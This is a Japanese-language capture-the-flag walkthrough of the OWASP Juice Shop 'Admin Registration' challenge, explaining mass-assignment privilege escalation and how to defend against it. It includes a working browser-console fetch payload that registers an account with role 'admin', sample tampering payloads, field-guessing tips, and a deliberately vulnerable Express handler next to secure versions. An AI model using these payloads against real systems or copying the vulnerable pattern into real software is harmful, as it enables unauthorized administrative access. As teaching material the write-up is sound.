# Admin Registration ✅

**難易度:** ⭐⭐⭐
**カテゴリ:** Mass Assignment / 権限昇格
**目標:** 管理者権限を持つアカウントを作成する

---

## 背景知識

### Mass Assignment（一括代入）脆弱性とは

Mass Assignment は、**フォームで送信されていないパラメータを API リクエストに追加して、本来変更できないフィールドを操作する攻撃**。

```
┌─────────────────────────────────────────────────────────────────┐
│                     正常な登録フロー                             │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  【登録フォーム】                                                │
│  ┌─────────────────────────┐                                   │
│  │ Email: [test@example.com]                                   │
│  │ Password: [********]                                        │
│  │ Confirm: [********]                                         │
│  │                                                             │
│  │ [登録]                                                      │
│  └─────────────────────────┘                                   │
│             │                                                   │
│             ▼                                                   │
│  POST /api/Users { email, password }                           │
│             │                                                   │
│             ▼                                                   │
│  DB: INSERT (email, password, role='customer')                 │
│                       ↑                                         │
│                  サーバーが設定                                  │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────┐
│                     Mass Assignment 攻撃                         │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  攻撃者が直接 API を呼び出し:                                    │
│                                                                 │
│  POST /api/Users                                                │
│  {                                                              │
│    "email": "hacker@example.com",                              │
│    "password": "password123",                                   │
│    "role": "admin"  ← 勝手に追加！                             │
│  }                                                              │
│             │                                                   │
│             ▼                                                   │
│  DB: INSERT (email, password, role='admin') 😱                 │
│                       ↑                                         │
│                  攻撃者が指定した値が                           │
│                  そのまま保存される                              │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 日常的な例え

会員登録フォームを想像してください:

- **フォームに表示される項目**: 名前、メールアドレス、パスワード
- **内部で管理される項目**: 会員ランク、ポイント、管理者フラグ

**正しい仕組み**: フォームにない項目は変更できない
**脆弱な仕組み**: フォームにない項目も、リクエストに含めれば反映される

例えるなら、入会申込書に「VIP会員: ☑」と勝手に書き足したら、VIP会員になれてしまうようなもの。

### なぜ起こるのか

フレームワークの便利機能が原因になることが多い:

```javascript
// 便利だが危険なコード
app.post('/api/Users', (req, res) => {
  // req.body の全フィールドをそのまま保存
  User.create(req.body);  // ← 何でも受け入れる！
});
```

---

## 思考プロセス

### ステップ1: 登録フォームを分析

```
「登録フォームで入力できるのは:」
    ↓
「Email、Password、Password Repeat のみ」
    ↓
「でもサーバー側のユーザーモデルには他のフィールドもあるはず」
    ↓
「role、isAdmin、balance、level など...」
```

### ステップ2: APIリクエストを観察

```
「DevTools → Network で登録時のリクエストを確認」
    ↓
「POST /api/Users」
「Body: { email: "...", password: "..." }」
    ↓
「このJSONに追加フィールドを入れたら？」
```

### ステップ3: 隠しフィールドを推測

```
「どんなフィールド名が使われそう？」
    ↓
「よくある名前: role, isAdmin, admin, level, type」
    ↓
「SQLi で取得した DB スキーマから確認:」
「role VARCHAR(255) DEFAULT 'customer'」
    ↓
「role を 'admin' にしてみよう」
```

### ステップ4: 攻撃を実行

```
「role: 'admin' を追加してリクエスト送信」
    ↓
「成功！ユーザーが作成された」
    ↓
「作成されたアカウントでログインすると管理者権限」
```

---

## 実行手順

### Step 1: 通常の登録を観察

DevTools → Network で登録フォームを送信し、リクエストを確認:

```http
POST /api/Users HTTP/1.1
Content-Type: application/json

{
  "email": "user@example.com",
  "password": "password123",
  "passwordRepeat": "password123",
  "securityQuestion": { "id": 1 },
  "securityAnswer": "answer"
}
```

### Step 2: Mass Assignment を試行

Console で `role` を追加したリクエストを送信:

```javascript
fetch('/api/Users/', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    email: 'admin-hacker@juice-sh.op',
    password: 'admin123',
    passwordRepeat: 'admin123',
    role: 'admin',  // ← 追加！
    securityQuestion: { id: 1, question: "Your eldest siblings middle name?" },
    securityAnswer: 'test'
  })
}).then(r => r.json()).then(console.log);
```

### Step 3: 結果を確認

```json
{
  "status": "success",
  "data": {
    "id": 23,
    "email": "admin-hacker@juice-sh.op",
    "role": "admin",   // ← 管理者として登録された！
    ...
  }
}
```

### Step 4: 管理者としてログイン

作成したアカウントでログインし、`/#/administration` にアクセスすると、管理者ページが表示される。

---

## 脆弱なコードパターン

```javascript
// ❌ 脆弱なコード (Express + Sequelize)
app.post('/api/Users', async (req, res) => {
  // req.body をそのままモデルに渡す
  const user = await User.create(req.body);
  res.json({ status: 'success', data: user });
});
```

### 問題点

1. **入力の無検証**: クライアントからの全フィールドを受け入れ
2. **ホワイトリストなし**: 許可するフィールドを限定していない
3. **機密フィールドの保護なし**: `role`, `isAdmin` などが操作可能

---

## 安全な実装

```javascript
// ✅ 安全なコード
app.post('/api/Users', async (req, res) => {
  // 方法1: 許可するフィールドを明示的に指定（ホワイトリスト）
  const allowedFields = ['email', 'password', 'securityQuestion', 'securityAnswer'];
  const userData = {};

  for (const field of allowedFields) {
    if (req.body[field] !== undefined) {
      userData[field] = req.body[field];
    }
  }

  // role は常にデフォルト値を使用
  userData.role = 'customer';

  const user = await User.create(userData);
  res.json({ status: 'success', data: user });
});

// 方法2: pick を使用
const _ = require('lodash');
app.post('/api/Users', async (req, res) => {
  const userData = _.pick(req.body, ['email', 'password', 'securityQuestion', 'securityAnswer']);
  userData.role = 'customer';  // 強制的に設定
  const user = await User.create(userData);
  res.json({ status: 'success', data: user });
});
```

### ORM レベルでの対策

```javascript
// Sequelize の場合
const User = sequelize.define('User', {
  email: DataTypes.STRING,
  password: DataTypes.STRING,
  role: {
    type: DataTypes.STRING,
    defaultValue: 'customer',
    // ✅ createやupdateで変更不可にする
    set() { /* 何もしない、または例外をスロー */ }
  }
});
```

---

## 他の Mass Assignment パターン

### 残高の改ざん

```javascript
// 攻撃
{ "email": "...", "password": "...", "balance": 1000000 }
// → 100万円の残高を持つアカウントを作成
```

### フラグの変更

```javascript
// 攻撃
{ "email": "...", "isVerified": true, "isPremium": true }
// → 認証済み＋プレミアム会員として登録
```

### 関連オブジェクトの操作

```javascript
// 攻撃
{ "email": "...", "organizationId": 1 }
// → 別組織に所属するアカウントを作成
```

---

## フレームワーク別の対策

| フレームワーク | 対策方法 |
|--------------|---------|
| **Rails** | `strong_parameters` で許可パラメータを明示 |
| **Django** | `ModelSerializer` の `fields` または `exclude` |
| **Spring** | `@JsonIgnoreProperties(ignoreUnknown = true)` + 許可フィールド |
| **Express** | 手動でホワイトリストを実装、または `express-validator` |
| **Laravel** | `$fillable` または `$guarded` で保護 |

---

## 発見のためのテスト方法

1. **フィールド推測**: `role`, `admin`, `isAdmin`, `type`, `level`, `status`
2. **スキーマ取得**: SQLi でテーブル構造を確認
3. **エラーメッセージ**: 存在しないフィールドを送信してエラーを観察
4. **ドキュメント**: Swagger/OpenAPI 定義があれば確認

---

## 関連チャレンジ

- [Forged Feedback](forged-feedback.md) - パラメータ改ざん
- [Empty User Registration](../difficulty-2/empty-user-registration.md) - 空の登録
- [Database Schema](database-schema.md) - SQLi でスキーマ取得

## 参考リンク

- [OWASP Mass Assignment](https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html)
- [CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes](https://cwe.mitre.org/data/definitions/915.html)
- [PortSwigger - Mass Assignment Vulnerabilities](https://portswigger.net/web-security/api-testing/lab-mass-assignment)
